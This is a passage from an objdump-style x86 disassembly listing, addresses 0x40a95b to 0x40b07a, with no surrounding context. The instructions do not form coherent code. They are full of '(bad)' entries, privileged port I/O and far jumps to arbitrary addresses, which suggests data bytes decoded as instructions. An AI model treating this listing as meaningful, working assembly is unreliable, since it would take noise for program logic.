  40a95b:	sub    edx,ecx
  40a95d:	jecxz  0x40a974
  40a95f:	std    
  40a960:	icebp  
  40a961:	das    
  40a962:	sub    al,0x6e
  40a964:	push   cs
  40a965:	jae    0x40a958
  40a967:	nop
  40a968:	leave  
  40a969:	add    al,0x5c
  40a96b:	test   dh,dh
  40a96d:	adc    ah,ah
  40a96f:	mov    ecx,0xdf76cf92
  40a974:	xlat   BYTE PTR ds:[ebx]
  40a975:	dec    esi
  40a976:	in     al,dx
  40a977:	lds    eax,FWORD PTR ss:0x3a5a09b7
  40a97e:	or     bh,BYTE PTR [esi]
  40a980:	cmp    eax,0xf020e54e
  40a985:	pop    edi
  40a986:	add    ah,dh
  40a988:	and    DWORD PTR [edi-0x3308f71f],esi
  40a98e:	out    dx,al
  40a98f:	xor    DWORD PTR [edi],0xffffffae
  40a992:	out    dx,al
  40a993:	adc    eax,DWORD PTR [edx-0x7e01ad6a]
  40a999:	mov    ecx,0x88f3bcb0
  40a99e:	pop    esp
  40a99f:	fidivr DWORD PTR [si-0x7807]
  40a9a4:	sbb    eax,DWORD PTR [edi+0xe]
  40a9a7:	sti    
  40a9a8:	pusha  
  40a9a9:	jnp    0x40a996
  40a9ab:	int    0x19
  40a9ad:	pop    edx
  40a9ae:	stc    
  40a9af:	sti    
  40a9b0:	lds    ebx,FWORD PTR ds:0xf0db0af5
  40a9b6:	out    0x30,eax
  40a9b8:	dec    ebp
  40a9b9:	mov    DWORD PTR [esi+0x57cda872],esp
  40a9bf:	jae    0x40a9ba
  40a9c1:	xor    eax,0xc45dc771
  40a9c6:	dec    esp
  40a9c7:	mov    bl,0xb
  40a9c9:	shl    esp,0x8d
  40a9cc:	mov    ds:0x11bfa5fd,eax
  40a9d1:	out    dx,al
  40a9d2:	sbb    eax,0x93b97b86
  40a9d7:	push   ss
  40a9d8:	stos   DWORD PTR es:[edi],eax
  40a9d9:	rol    BYTE PTR [esi-0x7f],0x60
  40a9dd:	ret    
  40a9de:	int3   
  40a9df:	nop
  40a9e0:	out    dx,al
  40a9e1:	xchg   edx,eax
  40a9e2:	mov    ebp,0xb941aa40
  40a9e7:	push   edi
  40a9e8:	cwde   
  40a9e9:	mov    cl,BYTE PTR [ecx]
  40a9eb:	shr    ch,0x2e
  40a9ee:	outs   dx,BYTE PTR ds:[esi]
  40a9ef:	or     al,0xed
  40a9f1:	jmp    0xb80e:0x13fe1e25
  40a9f8:	or     al,0xcf
  40a9fa:	iret   
  40a9fb:	inc    eax
  40a9fc:	(bad)  
  40a9fd:	dec    esp
  40a9fe:	dec    esi
  40a9ff:	mov    dh,0x48
  40aa01:	fistp  DWORD PTR [edx-0x28df7e17]
  40aa07:	ins    DWORD PTR es:[edi],dx
  40aa08:	fiadd  DWORD PTR [ecx-0x2609ac56]
  40aa0e:	jae    0x40a9ef
  40aa10:	scas   al,BYTE PTR es:[edi]
  40aa11:	loope  0x40a9d1
  40aa13:	jecxz  0x40aa5d
  40aa15:	mov    ecx,0xabd51bf1
  40aa1a:	xchg   esi,eax
  40aa1b:	push   edi
  40aa1c:	test   DWORD PTR [eax],edx
  40aa1e:	das    
  40aa1f:	pop    esp
  40aa20:	or     edi,DWORD PTR cs:[edi]
  40aa23:	jge    0x40aa7d
  40aa25:	pop    esi
  40aa26:	dec    ebx
  40aa27:	hlt    
  40aa28:	or     bl,BYTE PTR [ebx+0x1dc25ff0]
  40aa2e:	(bad)  
  40aa2f:	(bad)  
  40aa30:	jmp    0x40aa70
  40aa32:	sar    DWORD PTR [esi],cl
  40aa34:	and    dl,BYTE PTR [eax+ebp*4-0x61]
  40aa38:	sbb    BYTE PTR [ebx+0x63],0xba
  40aa3c:	aas    
  40aa3d:	iret   
  40aa3e:	imul   DWORD PTR [eax]
  40aa40:	cli    
  40aa41:	mov    ebp,0x40bc0b78
  40aa46:	push   ebp
  40aa47:	sbb    eax,0x94282ada
  40aa4c:	ret    
  40aa4d:	pop    ecx
  40aa4e:	xor    al,0x24
  40aa50:	jg     0x40a9f9
  40aa52:	rcr    BYTE PTR [eax-0x52],cl
  40aa55:	lods   eax,DWORD PTR ds:[esi]
  40aa56:	cmp    BYTE PTR ss:[edx+0x55d3ca64],bl
  40aa5d:	mov    WORD PTR [edx],?
  40aa5f:	repnz popfw 
  40aa62:	mov    edx,0x34d340ac
  40aa67:	std    
  40aa68:	mov    dh,0x62
  40aa6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa6b:	mov    ebx,0x5124eba8
  40aa70:	(bad)  
  40aa71:	cmp    bh,BYTE PTR [edx-0x7b]
  40aa74:	jne    0x40aac4
  40aa76:	dec    ecx
  40aa77:	sub    BYTE PTR [esi+0x9d2ed30],dl
  40aa7d:	inc    esi
  40aa7e:	out    0xc8,al
  40aa80:	lods   al,BYTE PTR ds:[esi]
  40aa81:	pusha  
  40aa82:	fild   DWORD PTR [ebx]
  40aa84:	pop    es
  40aa85:	retf   0xcd0d
  40aa88:	xor    al,BYTE PTR [eax+0x17cd5c6d]
  40aa8e:	dec    ebx
  40aa8f:	cli    
  40aa90:	or     eax,0x8ea75a7e
  40aa95:	sbb    ah,cl
  40aa97:	push   ebp
  40aa98:	push   ecx
  40aa99:	mov    esp,0xd6b76dc6
  40aa9e:	cwde   
  40aa9f:	push   cs
  40aaa0:	in     eax,0x75
  40aaa2:	jge    0x40aad4
  40aaa4:	test   DWORD PTR [edx+ecx*4-0x4c],esp
  40aaa8:	ret    
  40aaa9:	and    BYTE PTR [ecx],cl
  40aaab:	mov    esi,esi
  40aaad:	mov    ds:0xaebad26d,al
  40aab2:	stos   BYTE PTR es:[edi],al
  40aab3:	mov    esp,0xea29d087
  40aab8:	xor    bh,bl
  40aaba:	stos   BYTE PTR es:[edi],al
  40aabb:	test   al,0x9d
  40aabd:	sub    ch,cl
  40aabf:	fs out dx,al
  40aac1:	mov    ecx,0xfb99eed0
  40aac6:	cli    
  40aac7:	or     esi,edi
  40aac9:	addr16 mov edx,0xeb4e3a8b
  40aacf:	(bad)  
  40aad0:	push   ss
  40aad1:	into   
  40aad2:	adc    DWORD PTR [ecx+0x2f],esp
  40aad5:	jmp    0x40ab49
  40aad7:	sbb    edx,DWORD PTR [esi-0x38]
  40aada:	lea    ebp,[ebx+eiz*4-0x4be60e1c]
  40aae1:	inc    esi
  40aae2:	popa   
  40aae3:	pop    ds
  40aae4:	dec    ebp
  40aae5:	mov    ebp,0xbb1aaf5b
  40aaea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aaeb:	inc    ebp
  40aaec:	push   esp
  40aaed:	add    edi,edx
  40aaef:	or     al,0xf0
  40aaf1:	and    eax,0x8a98d53d
  40aaf6:	imul   edi,ebp,0x24c66f0c
  40aafc:	dec    esp
  40aafd:	xchg   ebp,eax
  40aafe:	xlat   BYTE PTR ds:[ebx]
  40aaff:	mov    cl,0x46
  40ab01:	stos   DWORD PTR es:[edi],eax
  40ab02:	outs   dx,BYTE PTR ds:[esi]
  40ab03:	mov    ah,0x80
  40ab05:	outs   dx,BYTE PTR ds:[esi]
  40ab06:	fs aas 
  40ab08:	sbb    DWORD PTR [edi-0x75da0b7d],edx
  40ab0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab0f:	mov    ebp,DWORD PTR [ebx+edi*2+0x12]
  40ab13:	xor    ebx,edi
  40ab15:	or     al,0x57
  40ab17:	in     al,0x39
  40ab19:	in     al,dx
  40ab1a:	jg     0x40ab12
  40ab1c:	test   eax,0xe0395ed6
  40ab21:	in     al,dx
  40ab22:	sbb    eax,DWORD PTR [eax]
  40ab24:	out    dx,al
  40ab25:	mov    ds:0x218af642,eax
  40ab2a:	push   cs
  40ab2b:	arpl   WORD PTR [edx+0x19],sp
  40ab2e:	mov    BYTE PTR [edi],dh
  40ab30:	xchg   esp,eax
  40ab31:	jne    0x40ab34
  40ab33:	test   BYTE PTR [eax+edi*8-0x7c],dh
  40ab37:	mov    esp,0xc813e5ee
  40ab3c:	cmc    
  40ab3d:	ins    BYTE PTR es:[edi],dx
  40ab3e:	arpl   ax,di
  40ab40:	add    BYTE PTR [eax-0x35],bh
  40ab43:	mov    dl,0xf0
  40ab45:	ins    BYTE PTR es:[edi],dx
  40ab46:	pop    ecx
  40ab47:	add    dh,ah
  40ab49:	adc    DWORD PTR [esi+edx*2+0x4],0x6d4f6afd
  40ab51:	mov    ebp,0xaae6bbd6
  40ab56:	inc    edi
  40ab57:	jg     0x40aae4
  40ab59:	sbb    al,BYTE PTR [ecx+0x7a]
  40ab5c:	daa    
  40ab5d:	shl    DWORD PTR [ebx+0x7aeb0bbc],0x3a
  40ab64:	popf   
  40ab65:	adc    dl,al
  40ab67:	sbb    ah,ah
  40ab69:	sar    BYTE PTR [ebx-0x70],1
  40ab6c:	jmp    0xfcd10a66
  40ab71:	adc    bh,BYTE PTR [edi+0x29146fc6]
  40ab77:	in     al,dx
  40ab78:	(bad)  
  40ab79:	or     al,0xb2
  40ab7b:	out    dx,eax
  40ab7c:	(bad)  
  40ab7d:	or     bl,ch
  40ab7f:	and    DWORD PTR [edx-0x7e2bbc8d],0xffffff88
  40ab86:	imul   ecx,DWORD PTR [ebp-0x42],0xfffffffc
  40ab8a:	xchg   esi,eax
  40ab8b:	int    0xd4
  40ab8d:	shl    DWORD PTR [ebp-0x367c6029],cl
  40ab93:	test   al,0xe9
  40ab95:	test   eax,0xaf65261
  40ab9a:	test   al,0x9c
  40ab9c:	out    dx,al
  40ab9d:	push   0x30
  40ab9f:	mov    dl,0xb9
  40aba1:	retf   0x5999
  40aba4:	mov    al,ds:0xaab5e994
  40aba9:	sbb    edi,DWORD PTR [edx]
  40abab:	dec    ebx
  40abac:	add    eax,0x2843ba93
  40abb1:	bound  ecx,QWORD PTR [eax+0x46da42a7]
  40abb7:	mov    al,ds:0x622ab825
  40abbc:	or     al,0x2b
  40abbe:	pusha  
  40abbf:	or     ah,bl
  40abc1:	cmp    DWORD PTR [ebp+0x420d1eea],0xf2d23db0
  40abcb:	cld    
  40abcc:	repz mov WORD PTR [esi],fs
  40abcf:	rcr    BYTE PTR [esp+eiz*2],cl
  40abd2:	les    ebp,FWORD PTR [ebx-0x63]
  40abd5:	sub    BYTE PTR [edi],ch
  40abd7:	mov    al,0xa6
  40abd9:	ss stos DWORD PTR es:[edi],eax
  40abdb:	shl    DWORD PTR [edi],cl
  40abdd:	xchg   BYTE PTR [esi+0x3a],dl
  40abe0:	stc    
  40abe1:	xor    eax,0x332f34e7
  40abe6:	stc    
  40abe7:	lahf   
  40abe8:	aaa    
  40abe9:	ins    BYTE PTR es:[edi],dx
  40abea:	test   al,0xd5
  40abec:	call   DWORD PTR [ebx-0x4b]
  40abef:	ret    0x987f
  40abf2:	mov    DWORD PTR [edx],edx
  40abf4:	jne    0x40abaf
  40abf6:	and    BYTE PTR [ebp+0x41],dh
  40abf9:	jg     0x40ab84
  40abfb:	mov    dh,0x57
  40abfd:	inc    ecx
  40abfe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abff:	dec    ebp
  40ac00:	mov    ?,edx
  40ac02:	pop    es
  40ac03:	inc    esi
  40ac04:	dec    ebx
  40ac05:	dec    esp
  40ac06:	pop    esi
  40ac07:	cmovo  edi,DWORD PTR [eax-0xe7e5ada]
  40ac0e:	test   al,0xd9
  40ac10:	sbb    bh,ah
  40ac12:	xor    bh,BYTE PTR [edx+0x556ea7f3]
  40ac18:	push   esi
  40ac19:	daa    
  40ac1a:	inc    esi
  40ac1b:	pop    ecx
  40ac1c:	jno    0x40ac2d
  40ac1e:	push   eax
  40ac1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac20:	xchg   DWORD PTR [ebx],edi
  40ac22:	or     BYTE PTR [ebx-0x1d0c6f68],al
  40ac28:	pusha  
  40ac29:	push   ss
  40ac2a:	inc    eax
  40ac2b:	ret    
  40ac2c:	jmp    0x97bf:0xff561a6e
  40ac33:	sahf   
  40ac34:	jmp    0x40ac68
  40ac36:	xor    bl,ah
  40ac38:	mov    bh,0x82
  40ac3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac3b:	mov    DWORD PTR [ecx-0x426e3e59],ebp
  40ac41:	dec    ecx
  40ac42:	repz bound esp,QWORD PTR [esi]
  40ac45:	sbb    DWORD PTR [edi+0x76],eax
  40ac48:	sbb    cl,BYTE PTR [edx-0x27]
  40ac4b:	(bad)  
  40ac4c:	call   0xd4a2:0x48d6c4f7
  40ac53:	xchg   esi,eax
  40ac54:	arpl   WORD PTR [ecx-0x38bec048],sp
  40ac5a:	sti    
  40ac5b:	imul   ebx,esp,0x37
  40ac5e:	ja     0x40abe2
  40ac60:	pop    es
  40ac61:	mov    esi,0x2423639e
  40ac66:	aam    0x4c
  40ac68:	lahf   
  40ac69:	fist   DWORD PTR [esi+0x4a3a7096]
  40ac6f:	test   DWORD PTR [esi],esp
  40ac71:	pop    ss
  40ac72:	(bad)  
  40ac73:	mov    DWORD PTR [ebx-0xc],ebp
  40ac76:	adc    al,0xca
  40ac78:	shr    BYTE PTR [eax+0x6f09fd14],1
  40ac7e:	(bad)  
  40ac7f:	call   0x5238397a
  40ac84:	shr    BYTE PTR [eax-0x1c86d93c],cl
  40ac8a:	dec    ecx
  40ac8b:	dec    si
  40ac8d:	cmp    al,0x76
  40ac8f:	adc    edx,DWORD PTR [ebx-0x3b00ed64]
  40ac95:	ins    BYTE PTR es:[edi],dx
  40ac96:	aas    
  40ac97:	fcmovnbe st,st(0)
  40ac99:	mov    ?,WORD PTR [edi-0x6a9037d7]
  40ac9f:	ret    0xbe40
  40aca2:	and    al,0x92
  40aca4:	sbb    cl,BYTE PTR ds:0x577bd726
  40acaa:	cmp    eax,0x3445e70b
  40acaf:	bound  ecx,QWORD PTR [edx-0x764f451e]
  40acb5:	xor    eax,0xc95a2968
  40acba:	push   ebp
  40acbb:	jns    0x40acc4
  40acbd:	dec    eax
  40acbe:	lds    di,DWORD PTR [ecx+0x66]
  40acc2:	nop
  40acc3:	xchg   DWORD PTR [ecx+0x22db090c],esp
  40acc9:	or     eax,0xd555fc46
  40acce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40accf:	add    ebx,DWORD PTR [ecx]
  40acd1:	and    ebx,DWORD PTR [ebp-0x41]
  40acd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40acd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acd6:	pop    ecx
  40acd7:	dec    ebx
  40acd8:	dec    edi
  40acd9:	mov    cl,BYTE PTR [eax+0x34]
  40acdc:	push   0x5a
  40acde:	adc    eax,0x757af5ad
  40ace3:	dec    ebx
  40ace4:	inc    eax
  40ace5:	mov    esi,0x9678eed2
  40acea:	ins    DWORD PTR es:[edi],dx
  40aceb:	mov    esp,0x86392989
  40acf0:	int    0x7d
  40acf2:	fisttp QWORD PTR [ecx-0x2d]
  40acf5:	mov    eax,ds:0xd42ffbea
  40acfa:	mov    ah,BYTE PTR ds:0xa990ec21
  40ad00:	xor    DWORD PTR [ebx+0x24],ebx
  40ad03:	xchg   ebx,eax
  40ad04:	jmp    0x40ad70
  40ad06:	int    0x83
  40ad08:	xchg   esp,eax
  40ad09:	jne    0x40ad45
  40ad0b:	pop    ds
  40ad0c:	mov    WORD PTR ds:0x7de17f71,ss
  40ad12:	xor    cl,ch
  40ad14:	iret   
  40ad15:	aad    0x8
  40ad17:	or     edi,DWORD PTR [edx+0x6d]
  40ad1a:	(bad)  
  40ad1b:	test   DWORD PTR [ecx],0xa81ac52
  40ad21:	mov    ebx,0x5bac783d
  40ad26:	mov    ah,0x9
  40ad28:	jb     0x40ad6a
  40ad2a:	xor    eax,0x7241ba9b
  40ad2f:	out    0xe3,al
  40ad31:	jne    0x40ad8a
  40ad33:	pop    edi
  40ad34:	cmp    edi,ebx
  40ad36:	arpl   cx,cx
  40ad38:	(bad)  
  40ad39:	jmp    0x1b9233db
  40ad3e:	aaa    
  40ad3f:	das    
  40ad40:	jae    0x40ad59
  40ad42:	loop   0x40acf5
  40ad44:	sbb    BYTE PTR [edx+ebp*2],cl
  40ad47:	dec    edx
  40ad48:	jle    0x40ad15
  40ad4a:	je     0x40ad4e
  40ad4c:	ret    
  40ad4d:	mov    al,ds:0x108f17f
  40ad52:	(bad)  
  40ad53:	push   esp
  40ad54:	sbb    DWORD PTR [edi],0x18
  40ad57:	aad    0x77
  40ad59:	clc    
  40ad5a:	adc    al,0xcc
  40ad5c:	push   ebp
  40ad5d:	scas   al,BYTE PTR es:[edi]
  40ad5e:	in     eax,0x5a
  40ad60:	xlat   BYTE PTR ds:[ebx]
  40ad61:	scas   al,BYTE PTR es:[edi]
  40ad62:	cwde   
  40ad63:	pushf  
  40ad64:	pop    ds
  40ad65:	xor    al,0xe
  40ad67:	mov    ds:0xc52150f6,eax
  40ad6c:	ror    DWORD PTR [eax-0x45be946],0x7d
  40ad73:	mov    ch,0x1b
  40ad75:	(bad)  
  40ad76:	stos   DWORD PTR es:[edi],eax
  40ad77:	std    
  40ad78:	in     eax,0xd7
  40ad7a:	push   cs
  40ad7b:	sbb    ch,al
  40ad7d:	scas   eax,DWORD PTR es:[edi]
  40ad7e:	dec    eax
  40ad7f:	ins    BYTE PTR es:[edi],dx
  40ad80:	loopne 0x40ad5e
  40ad82:	loopne 0x40ad6f
  40ad84:	cmp    ebx,ebx
  40ad86:	popa   
  40ad87:	lock and DWORD PTR [edi+0x7f],esi
  40ad8b:	fidiv  WORD PTR [edx+0x57]
  40ad8e:	mov    DWORD PTR [ebp-0x5536549e],edi
  40ad94:	push   0xcb59a2d
  40ad99:	fstp   QWORD PTR [ebp-0x2f82c469]
  40ad9f:	and    eax,0xce07b3a5
  40ada4:	push   edi
  40ada5:	sub    al,0x2
  40ada7:	fmul   QWORD PTR [eax-0x45]
  40adaa:	dec    ebp
  40adab:	cs inc eax
  40adad:	jl     0x40ad51
  40adaf:	add    DWORD PTR [edi-0x7],esi
  40adb2:	ins    BYTE PTR es:[edi],dx
  40adb3:	mov    esi,0x82f02695
  40adb8:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40adba:	cdq    
  40adbb:	(bad)  
  40adbc:	mov    eax,0xc49786ee
  40adc1:	lods   al,BYTE PTR ds:[esi]
  40adc2:	inc    esp
  40adc3:	mov    ebx,0x1bb4428c
  40adc8:	int    0xf0
  40adca:	inc    ebx
  40adcb:	dec    edx
  40adcc:	cs jb  0x40ad60
  40adcf:	popa   
  40add0:	dec    eax
  40add1:	scas   al,BYTE PTR es:[edi]
  40add2:	hlt    
  40add3:	push   ds
  40add4:	rol    DWORD PTR [edi+0x5840141a],cl
  40adda:	inc    ax
  40addc:	outs   dx,BYTE PTR ds:[esi]
  40addd:	sub    dh,BYTE PTR [esi-0x1b0287b3]
  40ade3:	int3   
  40ade4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ade5:	mov    eax,0x969331f8
  40adea:	mov    edx,0xd67f7eaa
  40adef:	(bad)  
  40adf0:	push   ebx
  40adf1:	in     eax,dx
  40adf2:	push   0x8cba12ea
  40adf7:	cld    
  40adf8:	inc    esi
  40adf9:	mov    al,0xd6
  40adfb:	push   es
  40adfc:	out    0x83,eax
  40adfe:	std    
  40adff:	push   ss
  40ae00:	aaa    
  40ae01:	sbb    ch,BYTE PTR [ebx-0x23]
  40ae04:	push   0xf95f0ee8
  40ae09:	jne    0x40ae78
  40ae0b:	and    eax,0x3742b11d
  40ae10:	retf   
  40ae11:	sbb    DWORD PTR [ecx+0x2],ebp
  40ae14:	cwde   
  40ae15:	or     DWORD PTR [ebp+0x59c18c76],esi
  40ae1b:	pop    es
  40ae1c:	dec    esp
  40ae1d:	adc    esp,ebx
  40ae1f:	popf   
  40ae20:	icebp  
  40ae21:	push   ebx
  40ae22:	call   0xbb2b4af7
  40ae27:	jle    0x40ae74
  40ae29:	mov    ebp,DWORD PTR [edi+0x3c]
  40ae2c:	inc    edi
  40ae2d:	xor    al,0x7e
  40ae2f:	xor    eax,0xd87732f4
  40ae34:	fisttp DWORD PTR [esi+ecx*8]
  40ae37:	gs dec edi
  40ae39:	push   ss
  40ae3a:	test   ch,bh
  40ae3c:	outs   dx,BYTE PTR ds:[si]
  40ae3e:	push   esi
  40ae3f:	outs   dx,DWORD PTR ds:[esi]
  40ae40:	pop    edx
  40ae41:	rcr    BYTE PTR [esi+0x46],0x89
  40ae45:	pop    es
  40ae46:	inc    edi
  40ae47:	xor    bl,BYTE PTR [ebp+0x54]
  40ae4a:	and    BYTE PTR [ecx],dh
  40ae4c:	outs   dx,BYTE PTR ds:[esi]
  40ae4d:	jecxz  0x40ae9d
  40ae4f:	ret    0x812c
  40ae52:	test   cl,0x8a
  40ae55:	ror    DWORD PTR [ecx],1
  40ae57:	paddd  mm4,QWORD PTR ds:0xcfb1d0ba
  40ae5e:	xchg   esi,eax
  40ae5f:	sar    esi,cl
  40ae61:	adc    eax,0xd5a5884
  40ae66:	dec    edi
  40ae67:	push   eax
  40ae68:	add    BYTE PTR [edx],al
  40ae6a:	into   
  40ae6b:	mov    WORD PTR [edi-0x56],ss
  40ae6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae6f:	dec    edx
  40ae70:	es adc al,0x1
  40ae73:	sbb    eax,0x2806c20f
  40ae78:	mov    edi,0xcb7db43c
  40ae7d:	stc    
  40ae7e:	inc    edx
  40ae7f:	pop    es
  40ae80:	sub    ah,al
  40ae82:	xchg   ebp,eax
  40ae83:	mov    dh,0xfc
  40ae85:	test   al,0xfd
  40ae87:	add    al,0xa9
  40ae89:	dec    esi
  40ae8a:	imul   edx,DWORD PTR [ecx],0xb
  40ae8d:	sti    
  40ae8e:	imul   DWORD PTR [eax-0x72]
  40ae91:	retf   
  40ae92:	inc    esp
  40ae93:	stos   BYTE PTR es:[edi],al
  40ae94:	mov    eax,0x2226da3c
  40ae99:	cs aaa 
  40ae9b:	mov    DWORD PTR [edi],ebx
  40ae9d:	xor    BYTE PTR [ecx+0x1c],bh
  40aea0:	repz cmp DWORD PTR [eax+0x56],ebx
  40aea4:	push   esi
  40aea5:	push   0x11
  40aea7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea8:	cmp    cl,BYTE PTR ds:0xb798d7b7
  40aeae:	or     bl,cl
  40aeb0:	neg    DWORD PTR [eax]
  40aeb2:	out    0xc0,eax
  40aeb4:	push   ebp
  40aeb5:	bound  esi,QWORD PTR [ecx+ebx*4+0x77]
  40aeb9:	(bad)  
  40aeba:	pop    edi
  40aebb:	call   0xb371750c
  40aec0:	push   ecx
  40aec1:	movhps QWORD PTR ds:0x882f1924,xmm6
  40aec8:	mul    BYTE PTR [edi-0x7ae6796a]
  40aece:	pusha  
  40aecf:	cdq    
  40aed0:	and    DWORD PTR [esi],edx
  40aed2:	repz fs or ebx,edx
  40aed6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aed7:	call   0xc195:0xfd105ef1
  40aede:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aedf:	test   bh,0x19
  40aee2:	push   0x9ef42ad0
  40aee7:	pop    ebx
  40aee8:	mov    WORD PTR [esi+ecx*8],cs
  40aeeb:	daa    
  40aeec:	pop    esp
  40aeed:	(bad)  
  40aeef:	stos   DWORD PTR es:[edi],eax
  40aef0:	and    BYTE PTR [esi+esi*4-0x4419611f],bl
  40aef7:	(bad)  
  40aef8:	out    dx,al
  40aef9:	(bad)  
  40aefb:	rcr    DWORD PTR [ecx+ecx*1],0xa3
  40aeff:	push   esp
  40af00:	sub    BYTE PTR [ebx-0x43ac1d7d],dh
  40af06:	imul   BYTE PTR [eax]
  40af08:	cwde   
  40af09:	je     0x40af63
  40af0b:	mov    bl,0x68
  40af0d:	(bad)  
  40af0e:	xchg   cl,bl
  40af10:	push   cs
  40af11:	push   esi
  40af12:	xor    eax,0x8adb6d87
  40af17:	test   al,0xbc
  40af19:	cmp    DWORD PTR [esi],esp
  40af1b:	jecxz  0x40af3f
  40af1d:	jge    0x40aef8
  40af1f:	(bad)  
  40af21:	ins    BYTE PTR es:[edi],dx
  40af22:	pop    es
  40af23:	or     bl,BYTE PTR [edx-0x41b92e85]
  40af29:	arpl   WORD PTR [esp+ecx*2-0x27],sp
  40af2d:	rcl    cl,1
  40af2f:	mov    bl,0x2
  40af31:	pusha  
  40af32:	mov    al,ds:0xe686e58e
  40af37:	cld    
  40af38:	pushf  
  40af39:	in     al,0x73
  40af3b:	cmp    DWORD PTR [ebx+ebx*1],esi
  40af3e:	sbb    eax,DWORD PTR [ebp+eiz*1-0x7d]
  40af42:	mov    WORD PTR [ecx-0x45],?
  40af45:	mov    esp,0x1a1d494d
  40af4a:	aad    0x36
  40af4c:	jge    0x40af01
  40af4e:	je     0x40af7f
  40af50:	ins    BYTE PTR es:[edi],dx
  40af51:	pop    edi
  40af52:	cmp    eax,0x651bd66c
  40af57:	mov    ch,0x1f
  40af59:	dec    ecx
  40af5a:	or     bh,al
  40af5c:	(bad)  
  40af5e:	push   ds
  40af5f:	lds    ebp,FWORD PTR [edi]
  40af61:	sub    al,0x6e
  40af63:	stc    
  40af64:	mov    al,ds:0x6e13f2cb
  40af69:	fst    st(7)
  40af6b:	jmp    0x5ee6:0x6e25f38f
  40af72:	and    ecx,ebx
  40af74:	inc    edx
  40af75:	pop    edi
  40af76:	scas   eax,DWORD PTR es:[edi]
  40af77:	cmp    edi,DWORD PTR [ebx+edx*1]
  40af7a:	xchg   ecx,eax
  40af7b:	sbb    eax,0x363c8db
  40af80:	cmp    al,0x78
  40af82:	inc    ebp
  40af83:	int    0xc4
  40af85:	scas   al,BYTE PTR es:[edi]
  40af86:	mov    dh,0x8b
  40af88:	shl    BYTE PTR [ebx],cl
  40af8a:	leave  
  40af8b:	mov    cl,0xa5
  40af8d:	pop    ds
  40af8e:	sub    eax,0xd5bb3f3c
  40af93:	jp     0x40afa0
  40af95:	xchg   ecx,eax
  40af96:	push   ss
  40af97:	push   edx
  40af98:	jno    0x40afe1
  40af9a:	in     eax,0x3b
  40af9c:	jb     0x40afeb
  40af9e:	xchg   esi,eax
  40af9f:	xchg   edx,esp
  40afa1:	aam    0x9f
  40afa3:	out    dx,eax
  40afa4:	jge    0x40b011
  40afa6:	test   BYTE PTR [edi],bl
  40afa8:	sbb    eax,0xb8e38505
  40afad:	(bad)  
  40afae:	retf   0x56cd
  40afb1:	mov    dh,0x74
  40afb3:	push   ss
  40afb4:	addr16 (bad) 
  40afb6:	cmp    al,0xf7
  40afb8:	jge    0x40af88
  40afba:	adc    dh,BYTE PTR [ecx+0x3736a9e1]
  40afc0:	icebp  
  40afc1:	push   0xffffffc7
  40afc3:	dec    esp
  40afc4:	pop    ebx
  40afc5:	xor    cl,dl
  40afc7:	stos   DWORD PTR es:[edi],eax
  40afc8:	scas   al,BYTE PTR es:[edi]
  40afc9:	xchg   edi,eax
  40afca:	fisttp QWORD PTR [eax+0x5f69c466]
  40afd0:	xor    edx,DWORD PTR [eax]
  40afd2:	(bad)  
  40afd3:	std    
  40afd4:	repnz dec edx
  40afd6:	test   al,0xa2
  40afd8:	push   edi
  40afd9:	std    
  40afda:	or     ah,BYTE PTR [ecx-0x2]
  40afdd:	sbb    al,0xbf
  40afdf:	mov    ah,cl
  40afe1:	and    eax,0x28bc865a
  40afe6:	add    eax,0xe50aea3
  40afeb:	xchg   ebx,eax
  40afec:	lea    ecx,[eax]
  40afee:	adc    eax,0xd6d11bec
  40aff3:	mov    al,ds:0xa4f2bcb1
  40aff8:	xor    BYTE PTR [edi+0x7b],dl
  40affb:	inc    ebp
  40affc:	mov    ds:0x1e0f9470,eax
  40b001:	test   DWORD PTR [ebx+0x23],ebx
  40b004:	call   DWORD PTR [edx]
  40b006:	cmp    DWORD PTR [esi-0x3efd8390],esp
  40b00c:	and    al,BYTE PTR [edi-0x13]
  40b00f:	pusha  
  40b010:	sbb    esi,DWORD PTR [esi-0x3c5791a1]
  40b016:	or     DWORD PTR [ebx+0x33a5cd5b],edx
  40b01c:	adc    eax,0xcf2551eb
  40b021:	pop    ds
  40b022:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b023:	pop    eax
  40b024:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b025:	mov    al,ds:0x8bef1fc2
  40b02a:	(bad)  
  40b02b:	fcomp  QWORD PTR [edx-0x45]
  40b02e:	sar    esp,cl
  40b030:	dec    esp
  40b031:	xchg   ebp,eax
  40b032:	jmp    0xa8e3:0x55cf1d85
  40b039:	xor    edx,edi
  40b03b:	xor    al,0x88
  40b03d:	ret    0x64c5
  40b040:	dec    eax
  40b041:	jg     0x40b044
  40b043:	lock mov dh,0xe6
  40b046:	fldcw  WORD PTR [esi+0x20e55bf8]
  40b04c:	pusha  
  40b04d:	pop    edx
  40b04e:	and    esi,DWORD PTR [ebx+0x43]
  40b051:	inc    BYTE PTR [ebp+0x4d195459]
  40b057:	les    ecx,FWORD PTR [ebx-0x267185bb]
  40b05d:	es fdivr st(5),st
  40b060:	test   DWORD PTR [ebx-0x6],edi
  40b063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b064:	outs   dx,DWORD PTR ds:[esi]
  40b065:	xchg   edx,eax
  40b066:	xchg   esp,eax
  40b067:	repnz pop bp
  40b06a:	inc    ebx
  40b06b:	test   eax,0x647baead
  40b070:	cwde   
  40b071:	loop   0x40b070
  40b073:	ins    DWORD PTR es:[edi],dx
  40b074:	out    dx,eax
  40b075:	sbb    eax,0x9209d47e
  40b07a:	cmp    ecx,DWORD PTR [eax-0x75]
